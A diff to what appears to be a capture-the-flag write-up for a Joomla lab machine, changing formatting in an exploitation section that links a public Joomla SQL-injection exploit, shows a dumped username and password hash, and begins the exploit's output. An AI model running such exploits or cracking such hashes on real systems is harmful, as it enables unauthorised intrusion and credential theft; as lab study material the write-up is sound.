@@ -126,11 +126,11 @@ Password: [                    ][?]
 
 ## Exploitation - John
 
-- **Exploit Used:** <a class="button button--outline button--info" href="https://github.com/stefanlucas/Exploit-Joomla">Exploit GitHub</a>
+- **Exploit Used:** <a class="button button--outline button--info" href="https://github.com/stefanlucas/Exploit-Joomla">GitHub</a>
 - **Username:** <b style={{ color: 'Chartreuse' }}>jonah</b>
 - **HASH:** <b style={{ color: 'Coral' }}>$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MFbZhz0jVMw.V.d3p12kBtZutm</b>
 
-```py
+```py {5}
 [-] Fetching CSRF token
 [-] Testing SQLi
 -  Found table: fb9j5_users
